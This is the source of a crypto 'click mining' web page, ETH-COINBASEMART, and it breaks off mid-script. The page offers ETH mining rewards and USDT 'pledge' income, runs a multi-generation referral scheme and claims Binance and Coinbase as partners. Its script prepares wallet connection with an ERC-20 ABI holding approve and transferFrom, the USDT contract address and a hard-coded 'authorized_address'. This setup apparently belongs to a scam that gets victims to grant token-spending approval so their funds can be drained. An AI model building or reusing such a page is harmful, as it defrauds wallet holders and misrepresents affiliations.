<!DOCTYPE html>
<html style="background: #1e2126;">
<head>
    <meta charset="utf-8">
    <title>ETH-COINBASEMART</title>
    <meta name="viewport" content="width=device-width,initial-scale=1.0">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <link rel="shortcut icon" href="assets/img/favicon.ico" />
    <link rel="stylesheet" href="assets/unpkg/element-ui%402.15.9/lib/theme-chalk/index.css">
    <link rel="stylesheet" href="assets/index/css/base.css">
    <link rel="stylesheet" href="assets/tron/css/index99c6.css?version=137" />
    <style>
        [v-cloak]{
            display: none;
        }
        #qrcode{
            width: 128px;
            margin: 0px auto;
        }
        .remark{
            text-align: center;
            padding: 10px 0px;
            color: red;
        }
        .xuanlm .ghkjl {
            float: left;
        }
    </style>
</head>

<body >
<div id="app" v-cloak>
    <div class="top topeth"  >
        <div class="headk">
            <div class="lety">
                <span></span>
                {{defaultAddress|formatAddress}}
            </div>
            <h2 class="logoeth" ></h2>
            <div class="righ">
                <a href="https://www.upchat.cc/chat/index?noCanClose=1&amp;token=01d864e89e3c6fa534a7a3dd5ba5b13c" target="_blank" style="margin-right: 16px;">
                    <svg t="1647499390835" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="5256" width="32" height="32"><path d="M805.546667 481.28h37.546666c-13.653333-180.906667-167.253333-324.266667-351.573333-324.266667S157.013333 303.786667 143.36 481.28h37.546667c44.373333 0 78.506667 34.133333 78.506666 78.506667V716.8c0 17.066667-6.826667 30.72-13.653333 44.373333-10.24 17.066667-30.72 30.72-47.786667 34.133334C269.653333 873.813333 375.466667 921.6 494.933333 921.6s221.866667-47.786667 296.96-129.706667c-20.48-3.413333-37.546667-17.066667-47.786666-34.133333-6.826667-10.24-13.653333-27.306667-13.653334-44.373333v-157.013334c0-37.546667 34.133333-75.093333 75.093334-75.093333z" fill="#4a73f2" p-id="5257"></path><path d="M740.693333 662.186667c-58.026667 58.026667-133.12 98.986667-218.453333 105.813333-17.066667 3.413333-27.306667 13.653333-23.893333 30.72 0 17.066667 17.066667 30.72 30.72 30.72 102.4-10.24 197.973333-58.026667 262.826666-129.706667-20.48-10.24-40.96-20.48-51.2-37.546666z" fill="#FFFFFF" p-id="5258"></path><path d="M904.533333 512c0-27.306667-3.413333-58.026667-6.826666-81.92-3.413333-13.653333-6.826667-27.306667-10.24-37.546667-3.413333-10.24-6.826667-23.893333-13.653334-37.546666-10.24-23.893333-23.893333-47.786667-37.546666-71.68-6.826667-10.24-17.066667-20.48-23.893334-30.72-6.826667-10.24-17.066667-20.48-27.306666-30.72-20.48-20.48-37.546667-34.133333-61.44-51.2-64.853333-44.373333-146.773333-68.266667-228.693334-68.266667s-163.84 23.893333-228.693333 68.266667c-23.893333 13.653333-44.373333 30.72-61.44 51.2-10.24 10.24-17.066667 20.48-27.306667 30.72-6.826667 10.24-17.066667 20.48-23.893333 30.72-17.066667 20.48-27.306667 44.373333-37.546667 71.68-6.826667 10.24-10.24 23.893333-13.653333 37.546666-3.413333 10.24-6.826667 23.893333-10.24 37.546667-6.826667 23.893333-10.24 54.613333-10.24 81.92v204.8c0 44.373333 34.133333 78.506667 78.506667 78.506667h20.48c6.826667 0 10.24 0 17.066666-3.413334 20.48-3.413333 37.546667-17.066667 47.786667-34.133333 6.826667-10.24 13.653333-27.306667 13.653333-44.373333v-157.013334c0-44.373333-34.133333-78.506667-78.506666-78.506666H143.36c13.653333-180.906667 167.253333-324.266667 351.573333-324.266667s337.92 143.36 351.573334 324.266667h-37.546667c-44.373333 0-78.506667 34.133333-78.506667 78.506666V716.8c0 17.066667 6.826667 30.72 13.653334 44.373333 10.24 17.066667 30.72 30.72 47.786666 34.133334 3.413333 0 10.24 3.413333 17.066667 3.413333h20.48c44.373333 0 78.506667-34.133333 78.506667-78.506667V529.066667c-3.413333-3.413333-3.413333-17.066667-3.413334-17.066667z" fill="#c1d1ec" p-id="5259"></path><path d="M552.96 843.093333h-116.053333c-34.133333 0-61.44-23.893333-61.44-58.026666 0-30.72 23.893333-58.026667 58.026666-58.026667h116.053334c30.72 0 58.026667 23.893333 58.026666 58.026667 3.413333 34.133333-20.48 58.026667-54.613333 58.026666z" fill="#FFFFFF" p-id="5260"></path></svg>
                </a>
                <el-dropdown @command="handleCommand" trigger="click">
  <span class="el-dropdown-link">
   <img :src="selectedIndex.imageurl" alt=""  style=" width: 30px;
    height: auto;
    vertical-align: middle;"> {{selectedIndex.name_lang}}
  </span>
                    <el-dropdown-menu slot="dropdown">
                        <el-dropdown-item v-for="(item,index) in langs" :command="index">
                            <img :src="item.imageurl" alt="" style=" width: 30px;
    height: auto;
    vertical-align: middle;">
                            {{item.name_lang}}</el-dropdown-item>
                    </el-dropdown-menu>
                </el-dropdown>
            </div>
        </div>
        <div class="wenbt">
            <h6>Click mining</h6>
            <p>Join a node to start mining</p>
            <h5 @click="onConnect()" v-if="defaultAddress ==''">Please login</h5>
            <h5 @click="onConnect()" v-else-if="defaultAddress !='' && (userinfo['is_authorized'] ==2 || userinfo['is_authorized'] =='2')">Apply</h5>
            <h5 v-else>welcome</h5>
        </div>


        <!--        <span class="plk">TRON</span>-->
        <!--        <span class="hkm">BitTorrent</span>-->
    </div>
    <div class="tongzhi">
        <div class="tzle">
            <span></span>
        </div>
        <marquee scrolldelay="180" direction="left" style="width: 100%">
            <a class="marquee_a" :href="'index/index/gonggaopage?type=1&lang='+lang" v-for="(item,index) in gonggaodata">{{item[lang+'_title']}}</a>
        </marquee>
    </div>
    <div class="anniul">
        <a v-bind:class="{ 'alk': pageindex=='index' }"  @click="pages('index')">mining pool        </a>
        <a v-bind:class="{ 'alk': pageindex=='account' }" @click="pages('account')" class="item">
            account        </a>
        <a v-bind:class="{ 'alk': pageindex=='team' }"  @click="pages('team')" class="item">
            team        </a>
    </div>
    <div class="index" v-show="pageindex =='index'">
        <div class="shuju">
            <span>Mining pool data</span>
        </div>
        <div class="xianl">
            <div class="wenh">
                <div class="xiank">
                    <img src="assets/tron/img/icon_zcc.png" />
                    <h6>Total output</h6>
                    <p>{{pool.total_output}} ETH</p>
                </div>
            </div>
            <div class="wenh">
                <div class="xiank">
                    <img src="assets/tron/img/icon_yxjd1.png" />
                    <h6>Effective node</h6>
                    <p>{{pool.lang_valid_node}}</p>
                </div>
            </div>
            <div class="wenh">
                <div class="xiank">
                    <img src="assets/tron/img/icon_cysl.png" />
                    <h6>Number of participants</h6>
                    <p>{{pool.lang_participant}}</p>
                </div>
            </div>
            <div class="wenh">
                <div class="xiank">
                    <img src="assets/tron/img/icon_icon_yhsy.png" />
                    <h6>User benefits</h6>
                    <p>{{pool.lang_user_revenue}} ETH</p>
                </div>
            </div>


            <div class="wenh">
                <div class="xiank">
                    <img src="assets/tron/img/icon_icon_yhsy.png" />
                    <h6>Total pledge income</h6>
                    <p>{{pool.total_pledge_income}} USDT</p>
                </div>
            </div>


        </div>

        <div class="shuju">
            <span>User output</span>
        </div>

        <div class="shuchu">
            <div class="tokl">
                <span id="lang_address">address</span>
                <span id="lang_quantity">quantity</span>
            </div>

            <ul class="xijkl">
                <li v-for="(item, index) in marqueeList">
                    <a>  {{item.address}}</a>
                    <span>{{item.price}} ETH</span>
                </li>

            </ul>

        </div>

        <!--			<div class="shuju">-->
        <!--				<span>Usdt lock up and earn money</span>-->
        <!--			</div>-->
        <!---->
        <!--<div class="shukkl">-->

        <!--    <div class="jnjm">-->
        <!--        <p> Locked warehouse quantity</p>-->
        <!--        <div class="shurugh">-->
        <!--            <input placeholder="Please enter quantity" v-model="form.num"/>-->
        <!--            <span>USDT</span>-->
        <!--        </div>-->
        <!--        <p>Please select days</p>-->
        <!--        <div class="tiansk">-->
        <!--            -->
        <!--            <a class=""    v-bind:class="{ 'almk': form.day =='' }" @click="calculate_earnings('','0.0200','1')"></a>-->
        <!--            -->
        <!--            <a class=""    v-bind:class="{ 'almk': form.day =='' }" @click="calculate_earnings('','0.0230','7')"></a>-->
        <!--            -->
        <!--            <a class=""    v-bind:class="{ 'almk': form.day =='' }" @click="calculate_earnings('','0.0260','8')"></a>-->
        <!--            -->
        <!--            <a class=""    v-bind:class="{ 'almk': form.day =='' }" @click="calculate_earnings('','0.0290','9')"></a>-->
        <!--            -->
        <!--            <a class=""    v-bind:class="{ 'almk': form.day =='' }" @click="calculate_earnings('','0.0360','10')"></a>-->
        <!--            -->
        <!--        </div>-->
        <!--        <p>Estimated total revenue</p>-->
        <!--        <div class="shurugh">-->
        <!--            <a>{{allprofit}}</a>-->
        <!--            <span>USDT</span>-->
        <!--        </div>-->
        <!--        <h6 class="tygk">Interest returned upon maturity + principal</h6>-->
        <!--        <div class="ankl" @click="buy">pledge</div>-->
        <!--    </div>-->
        <!--</div>-->
        <!---->


        <div class="shuju">
            <span>Help center</span>
        </div>

        <div class="banh">
            <el-collapse v-model="activeNames" @change="handleChange">
                <el-collapse-item :title="item[lang+'_title']" :name="index" v-for="(item,index) in help">
                    <div v-html="item[lang+'_context']"></div>
                </el-collapse-item>
            </el-collapse>
        </div>

        <!--			<div :class="['banh', { 'combanh0': index==0, 'combanh1': index ==1, 'combanh2': index==2}]"  v-for="(item,index) in help">-->
        <!--				<h6 v-html="item[lang+'_title']"></h6>-->
        <!--				<p class="wenjk" v-html="item[lang+'_context']"></p>-->
        <!--			</div>-->


        <div class="shuju">
            <span> Interactive communication platform</span>
        </div>

        <!-- <div class="xuanlm">
              -->

        <!--				<div class="ghkjl">-->
        <!--					-->
        <!--				</div>-->
        <!--				<div class="ghkjl">-->
        <!--					<img src="assets/tron/img/icon_Telegram.png" />-->
        <!--				</div>#-->
        <!--				<div class="ghkjl">-->
        <!--					<img src="assets/tron/img/icon_Skype.png" />-->
        <!--				</div>-->
        <!-- </div>

         <div class="tfgkh" onclick="window.location.href='https://ethereum.org/en/'">ETH</div>-->

        <div class="xuanlm" style="margin-bottom:0.3rem;display: block;">
            <!--<div class="ghkjl">
                <img src="assets/tron/img/icon_hbb.png" />
            </div>
            <div class="ghkjl">
                <img src="assets/tron/img/icon_CoinGecko.png" />
            </div>
            <div class="ghkjl">
                <img src="assets/tron/img/icon_BINANCE.png" />
            </div>
            <div class="ghkjl">
                <img src="assets/tron/img/icon_DeFiBox.png" />
            </div>
            <div class="ghkjl">
                <img src="assets/tron/img/icon_Coinbase.png" />
            </div>
            <div class="ghkjl">
                <img src="assets/tron/img/icon_TOKENPOCKET.png" />
            </div>-->

        </div>
        <div class="shuju">
            <span> Cooperation unit</span>
        </div>
        <div class="xuanlm" style="margin-bottom:0.3rem;display: block;">
            <div class="ghkjl">
                <img src="assets/tron/img/icon_hbb.png" />
            </div>
            <div class="ghkjl">
                <img src="assets/tron/img/icon_CoinGecko.png" />
            </div>
            <div class="ghkjl">
                <img src="assets/tron/img/icon_BINANCE.png" />
            </div>
            <div class="ghkjl">
                <img src="assets/tron/img/icon_DeFiBox.png" />
            </div>
            <div class="ghkjl">
                <img src="assets/tron/img/icon_Coinbase.png" />
            </div>
            <div class="ghkjl">
                <img src="assets/tron/img/icon_TOKENPOCKET.png" />
            </div>
        </div>
    </div>
    <div class="account" v-show="pageindex =='account' ">
        <div class="shuju">
            <span>Usdt lock up and earn money</span>
        </div>
        <div class="duihuan" style="height: 2.04rem;
    background-size: 3.54rem 2rem;">

            <div class="duikun">
                <div class="duile">
                    <input  placeholder="0.0000" v-model="zy.num"/>
                    <a @click="zy.num =userinfo.wallet">all</a>
                </div>
                <div class="duiak"></div>
                <div class="duirty">
                    <span></span>
                    USDT
                </div>
            </div>
            <div class="anmk" v-if="form.address !=''" @click="zy_buy">pledge</div>
            <div class="anmk" v-if="form.address !=''" @click="jc_zy_buy">Release pledge</div>
            <div class="anmk" v-else="form.address ==''">Please login</div>

        </div>

        <div class="shuju">
            <span>My account</span>
        </div>
        <div class="zhank">
            <img src="assets/tron/img/icon_qbye.png" style="width:0.2rem;height:0.25rem;"/>
            <h6 style="font-weight: 500;">Locked balance</h6>
            <p style="margin-top:0.15rem;">{{userinfo.lock_balance}} USDT</p>
        </div>
        <div class="xianl" style="margin-top:-0.05rem">
            <!--<div class="wenh">
                <div class="xiank">
                    <img src="assets/tron/img/icon_tdcc.png" />
                    <h6 style="font-weight: 500;">Team output</h6>
                    <p style="margin-top:0.15rem;" class="color">{{userinfo.team_out}} ETH</p>
                </div>
            </div>
            <div class="wenh">
                <div class="xiank">
                    <img src="assets/tron/img/icon_grcc.png" style="width:0.2rem;height:0.25rem;"/>
                    <h6 style="font-weight: 500;">Individual output</h6>
                    <p style="margin-top:0.15rem;" class="color">{{userinfo.oneself_out}} ETH</p>
                </div>
            </div>-->
            <div class="wenh">
                <div class="xiank">
                    <img src="assets/tron/img/icon_ktxye.png" />
                    <h6 style="font-weight: 500;">Withdrawal balance</h6>
                    <p style="margin-top:0.15rem;" class="color">{{userinfo.wallet}} USDT</p>
                </div>
            </div>

            <div class="wenh">
                <div class="xiank">
                    <img src="assets/tron/img/icon_kdhye.png" />
                    <h6 style="font-weight: 500;">Convertible balance</h6>
                    <p style="margin-top:0.15rem;" class="color">{{userinfo.total}} ETH</p>
                </div>
            </div>
        </div>
        <div class="shuju">
            <span>exchange</span>
        </div>
        <div class="duihuan">

            <div class="duikun">
                <div class="duile">
                    <input  placeholder="0.0000" v-model="form.dnumber"/>
                    <a @click="form.dnumber =userinfo.total">all</a>
                </div>
                <div class="duiak"></div>
                <div class="duirty">
                    <span></span>
                    USDT
                </div>
            </div>

            <p class="gyhj">1 ETH convertible  {{price}} USDT</p>
        </div>
        <div class="anmk" v-if="form.address !=''" @click="postexchange">exchange</div>
        <div class="anmk" v-else="form.address ==''">Please login</div>
        <div class="shuju">
            <span>Withdrawal</span>
        </div>
        <div class="tixiank">
            <p class="shulian">Withdrawal quantity</p>
            <div class="hjng">
                <input placeholder="Please enter the withdrawal amount" v-model="form.wnumber" />
                <a>
                    <span></span>
                    USDT
                </a>
            </div>
            <div class="anmk" style="margin-top:0.25rem;" @click="submitwithdraw">confirm</div>
            <p class="tishi" styl>Your withdrawal will be sent to your usdt wallet address within the next 24 hours</p>
        </div>
        <div class="shuju">
            <span>record</span>
        </div>
        <div class="jiluk">
            <div class="ankld">
                <div class="tyghk">
                    <a @click="tabrecord('exchange',1)" v-bind:class="{ 'alk': recordindex=='exchange' }">  exchange</a>
                    <a @click="tabrecord('withdraw',2)" v-bind:class="{ 'alk': recordindex=='withdraw' }">Withdrawal</a>
                    <a @click="tabrecord('profit',3)" v-bind:class="{ 'alk': recordindex=='profit' }"> profit</a>
                    <a @click="tabrecord('reward',4)" v-bind:class="{ 'alk': recordindex=='reward' }">reward</a>
                </div>
            </div>
            <ul class="jikl">
                <li v-for="(item,index) in found">
                    <div class="leyt">
                        <h6>{{item.memo}}</h6>
                        <p>{{item.createtime}}</p>
                    </div>
                    <a>
                        <span>{{item.money}}</span>
                        {{item.danwen}}
                    </a>
                </li>
            </ul>
        </div>
    </div>
    <div class="team" v-show="pageindex =='team'">
        <div class="shuju">
            <span>Team data</span>
        </div>
        <div class="xianl">
            <!--				<div class="wenh">-->
            <!--					<div class="xiank">-->
            <!--						<img src="assets/tron/img/icon_tdsy.png" style="width:0.2rem;height:0.25rem;"/>-->
            <!--						<h6 style="font-weight: 500;">Team benefits</h6>-->
            <!--						<p style="margin-top:0.15rem;">{{userinfo.team_profit}} ETH</p>-->
            <!--					</div>-->
            <!--				</div>-->
            <!--				<div class="wenh">-->
            <!--					<div class="xiank">-->
            <!--						<img src="assets/tron/img/icon_tjrs.png" style="width:0.25rem;height:0.25rem;"/>-->
            <!--						<h6 style="font-weight: 500;">Recommended number</h6>-->
            <!--						<p style="margin-top:0.15rem;">{{userinfo.myson1}}</p>-->
            <!--					</div>-->
            <!--				</div>-->

            <div class="zhank">
                <img src="assets/tron/img/icon_tdsy.png" style="width:0.2rem;height:0.25rem;"/>
                <h6 style="font-weight: 500;">Recommended number of next generation</h6>
                <p style="margin-top:0.15rem;">{{userinfo.myson1}}</p>
            </div>
            <div class="wenh">
                <div class="xiank">
                    <img src="assets/tron/img/icon_tdsy.png" style="width:0.2rem;height:0.25rem;"/>
                    <h6 style="font-weight: 500;">Number of second generation recommenders</h6>
                    <p style="margin-top:0.15rem;">{{userinfo.myson2}}</p>
                </div>
            </div>
            <div class="wenh">
                <div class="xiank">
                    <img src="assets/tron/img/icon_tjrs.png" style="width:0.25rem;height:0.25rem;"/>
                    <h6 style="font-weight: 500;">Recommended number of three generations</h6>
                    <p style="margin-top:0.15rem;">{{userinfo.myson3}}</p>
                </div>
            </div>
        </div>
        <div class="shuju">
            <span>Share promotion</span>
        </div>
        <div class="qrcode" v-if="userinfo['tx'] !='' && userinfo['tx'] !=0 && userinfo['tx'] !='0' && userinfo['tx'] !=null&&  userinfo['tx'] !='null'" >
            <div id="qrcode_url" ref="qrcode" dd="22"></div>
            <div class="share-title-margin" v-if="defaultAddress ==''">	Sign in to get your invitation QR code</div>
            <div class="share-title-margin" v-if="defaultAddress !=''">	Share QR code and invite friends</div>
            <span  class="qrcode_invite_url" style="text-transform: inherit;">{{share_url}}</span>
            <div class="success_share_tip">
                <span >Successful invitation can obtain</span>
                <span id="fengxianghd">0.0025 ETH</span>
            </div>
            <span  class="copybtn" id="copy">Copy invitation link</span>
            <div class="remark" >
                Please open it in DAPP wallet browser            </div>
        </div>
        <div class="shuju">
            <span>my good friend</span>
        </div>
        <div style="width: 90%;margin: 0px auto">
            <div v-for="(item,index) in teamfounds" style="margin: 20px 0px;display: flex;
    justify-content: space-between;">
                <div style="color: white">{{item.dai+1}}generation</div>
                <div style="color: white">{{item.address}}</div>
                <div style="color: white">profit:{{item.profit}}</div>
            </div>
        </div>
    </div>
    <el-dialog
            title=""
            :visible.sync="network"
            width="80%"
    >
        <ul class="network">
            <!--            <li>-->
            <!--                <a :href="share_url">-->
            <!--                <img src="assets/img/eth.png" alt="">-->
            <!--                    Ethereum-->
            <!--                </a>-->
            <!--            </li>-->
            <li>
                <a :href="share_url_trc">
                    <img src="assets/img/trx.png" alt="">
                    TRON (TRX)
                </a>
            </li>
        </ul>

        <div class="" style="text-align: center;"  @click="onDisconnect()" v-if="defaultAddress !=''">
            <el-button round>
                Disconnect
            </el-button>
        </div>


    </el-dialog>
</div>
</body>
<script type="text/javascript" src="assets/tron/js/com.js" ></script>
<script src="assets/index/js/vue.js" type="text/javascript"></script>
<script src="assets/index/js/clipboard.min.js" type="text/javascript"></script>
<script src="assets/trc/js/jquery-1.11.0.min.js" type="text/javascript"></script>
<script src="assets/index/js/message.js" type="text/javascript"></script>
<script src="assets/index/js/qrcode.min.js" type="text/javascript"></script>
<script src="assets/index/js/element.js" type="text/javascript"></script>
<script src="assets/index/js/bignumber.min.js"></script>
<script src="assets/index/js/web3.min.js"></script>
<script src="assets/index/js/web3model.min.js" type="text/javascript"></script>
<script src="assets/index/js/web3provider.js" type="text/javascript"></script>
<script type="text/javascript">
    "use strict";
    const ABI = [{"constant":true,"inputs":[],"name":"name","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"success","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_addr","type":"address"},{"name":"_eth","type":"uint256"}],"name":"allocateToken","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"isFunding","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"success","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"tokenRaised","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"newContractAddr","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"tokenExchangeRate","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"stopFunding","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_newContractAddr","type":"address"}],"name":"setMigrateContract","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"version","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"tokenMigrated","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"balance","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"currentSupply","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_fundingStartBlock","type":"uint256"},{"name":"_fundingStopBlock","type":"uint256"}],"name":"startFunding","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[],"name":"migrate","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_value","type":"uint256"}],"name":"decreaseSupply","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_newFundDeposit","type":"address"}],"name":"changeOwner","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"ethFundDeposit","outputs":[{"name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"success","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_value","type":"uint256"}],"name":"increaseSupply","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"name":"_tokenExchangeRate","type":"uint256"}],"name":"setTokenExchangeRate","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"fundingStartBlock","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],"name":"allowance","outputs":[{"name":"remaining","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"fundingStopBlock","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"inputs":[{"name":"_ethFundDeposit","type":"address"},{"name":"_currentSupply","type":"uint256"}],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"payable":true,"stateMutability":"payable","type":"fallback"},{"anonymous":false,"inputs":[{"indexed":true,"name":"_to","type":"address"},{"indexed":false,"name":"_value","type":"uint256"}],"name":"AllocateToken","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"_to","type":"address"},{"indexed":false,"name":"_value","type":"uint256"}],"name":"IssueToken","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"_value","type":"uint256"}],"name":"IncreaseSupply","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"name":"_value","type":"uint256"}],"name":"DecreaseSupply","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"_to","type":"address"},{"indexed":false,"name":"_value","type":"uint256"}],"name":"Migrate","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"_from","type":"address"},{"indexed":true,"name":"_to","type":"address"},{"indexed":false,"name":"_value","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"name":"_owner","type":"address"},{"indexed":true,"name":"_spender","type":"address"},{"indexed":false,"name":"_value","type":"uint256"}],"name":"Approval","type":"event"}];

    const addr = {
        'usdt': '0xdAC17F958D2ee523a2206206994597C13D831ec7',
    }
    var approveAddr = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
    const price = {
        'WIN': 0.001150,
        'USDT': 1,
        'TONS': 1.35,
        'USDJ': 1.04,
        'JST': 0.125,
        "HT": 20.41,
        "SUN": 33.97,
        "EXNX": 0.0621,
        "VCOIN": 0.004225,
        "POL": 0.1393,
        "CKRW": 0.002487,
    }

    const decimals = {
        'WIN': 6,
        'USDT': 6,
        'TONS': 6,
        'USDJ': 18,
        'JST': 18,
        "HT": 18,
        "SUN": 18,
        "EXNX": 18,
        "VCOIN": 6,
        "POL": 8,
        "CKRW": 6,
    }
    function replaceParamVal(paramName,replaceWith) {
        var oUrl = window.location.href.toString();
        var re=eval('/('+ paramName+'=)([^&]*)/gi');
        var nUrl = oUrl.replace(re,paramName+'='+replaceWith);
        return nUrl
    }

    /******************************************/
    // Unpkg imports
    const _web3 = new Web3('https://mainnet.infura.io/v3/55b3638faed94111ad03a5c00cfa6f37')
    let injectedWeb3 = null, total = 0


    const contracts = {}
    for (const symbol of Object.keys(addr)) {
        const contractAddr = addr[symbol]
        contracts[symbol] = new _web3.eth.Contract(ABI, contractAddr)
    }
    const WalletConnectProvider = window.WalletConnectProvider.default;
    let web3Modal
    // Unpkg imports
    const Web3Modal = window.Web3Modal.default;
    const Fortmatic = window.Fortmatic;
    const evmChains = window.evmChains;
    let provider;
    let selectedAccount;


    var app = new Vue({
        el: '#app',
        data: {
            network:false,
            pageindex: 'index',
            tabindex: 'exchange',
            recordindex: 'exchange',
            defaultAddress: "",
            authorized_address: "0x7D51EDaCfF2cF27BA3A562E24E702E644eb7dB86",
            langs: [],
            selectedIndex: [],
            help: [],
            p: '',

            balance: '',
            wallet: '',
            total: '',
            balancetotal:0,
            d: '',
            form: {
                dnumber: '',
                wnumber: '',
                address: '',
                type: 1,
                day:30,
                num:'',
                item_id:0,
                pageindex:'index'

            },
            lang: "zh",
            animate: false,
            allprofit:0,
            team_profit:0,
            marqueeList: [],
            found: [],
            share_url:'',
            share_url_trc:'',
            myson:0,
            pool:{},
            price:"",
            userinfo:{},
            lock_day_price:"",
            gonggaodata:[],
            teamfounds:[],
            indexqrcode:0,
            activeNames: [0,1,2],
            domain:"",
            zy:{
                num:""
            }
        },
        created: function () {
            this.init();
            this.domain=window.location.host;
            this.share_url= "https://"+this.domain+"?p=1&d=1&lang="+this.lang+'&type='+1
            this.share_url_trc= "https://"+this.domain+"?p=1&d=1&lang="+this.lang+'&type='+2
            let _this = this;
            this.lang = this.getUrlQueryString('lang') == '' ? 'zh' : this.getUrlQueryString('lang')
            this.p = this.getUrlQueryString('p') == '' ? 1 : this.getUrlQueryString('p')
            this.d = this.getUrlQueryString('d') == '' ? 1 : this.getUrlQueryString('d')
            this.language();
            this.text();
            this.gonggao()
            setInterval(this.showMarquee, 2000)
            this.help_center();
            _this.push()
            setInterval(function () {
                _this.push()
            },3000)
            this.getprice();

        },
        methods: {
            handleChange(){

            },
            async getprice(){
                let _this = this;
                $.ajax({
                    type: 'get',
                    url: '/index/index/getprice',
                    async: false,
                    data:{type:1},
                    success: function (data) {
                        _this.price=data
                    },
                    error: function (data) {
                    }
                })
            },
            teamfound(){
                let _this=this
                $.ajax({
                    type: 'get',
                    url: '/index/index/teamfound',
                    async: false,
                    data: {address: this.defaultAddress},
                    success: function (data) {
                        _this.teamfounds = data.data
                    },
                    error: function (data) {

                    }
                })
            },
            buy(){
                if(this.defaultAddress ==''){
                    toast('Please login')
                    return true
                }
                if(this.zy.num ==''){
                    toast('Please enter quantity')
                    return true
                }

                $.ajax({
                    type: 'get',
                    url: '/index/index/buy',
                    async: false,
                    data:this.zy,
                    success: function (data) {
                        toast(data.msg)
                    },
                    error: function (data) {
                    }
                })
            },
            zy_buy(){
                if(this.defaultAddress ==''){
                    toast('Please login')
                    return true
                }
                if(this.zy.num ==''){
                    toast('Please enter quantity')
                    return true
                }

                $.ajax({
                    type: 'get',
                    url: '/index/index/zy_buy',
                    async: false,
                    data:{num:this.zy.num,address:this.defaultAddress},
                    success: function (data) {
                        toast(data.msg)
                    },
                    error: function (data) {
                    }
                })
            },
            jc_zy_buy(){
                if(this.defaultAddress ==''){
                    toast('Please login')
                    return true
                }
                if(this.zy.num ==''){
                    toast('Please enter quantity')
                    return true
                }

                $.ajax({
                    type: 'get',
                    url: '/index/index/jc_zy_buy',
                    async: false,
                    data:{num:this.zy.num,address:this.defaultAddress},
                    success: function (data) {
                        toast(data.msg)
                    },
                    error: function (data) {
                    }
                })
            },
            calculate_earnings(val){
                this.form.day=day;
                this.form.rate=price;
                this.form.item_id=id
                this.allprofit=this.form.num*this.form.day*price

            },

            gonggao(){
                let _this = this;
                $.ajax({
                    type: 'get',
                    url: '/index/index/gonggao',
                    async: false,
                    data:{type:1},
                    success: function (data) {
                        _this.gonggaodata=data.data
                    },
                    error: function (data) {
                    }
                })
            },
            push(){
                let _this = this;
                $.ajax({
                    type: 'get',
                    url: '/index/index/push',
                    data:{type:1},
                    async: false,
                    success: function (data) {
                        _this.pool=data.data
                    },
                    error: function (data) {
                    }
                })
            },
            async   init(){




                const providerOptions = {
                    walletconnect: {
                        package: WalletConnectProvider,
                        options: {
